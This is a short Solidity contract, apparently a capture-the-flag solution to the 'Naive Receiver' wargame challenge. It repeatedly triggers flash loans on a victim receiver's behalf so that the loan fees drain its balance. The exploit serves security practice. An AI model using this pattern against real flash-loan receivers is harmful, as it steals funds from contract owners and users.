// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {NaiveReceiverLenderPool, IERC3156FlashBorrower} from "../naive-receiver/NaiveReceiverLenderPool.sol";

contract HackNaiveReceiver {
    NaiveReceiverLenderPool _pool;

    constructor(NaiveReceiverLenderPool pool_) {
        _pool = pool_;
    }

    function hackNaiveReceiver(IERC3156FlashBorrower receiver) external {
        address token = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
        uint256 amount = 1;
        for (uint256 i; i < 10; i++) {
            _pool.flashLoan(receiver, token, amount, "");
        }
    }
}
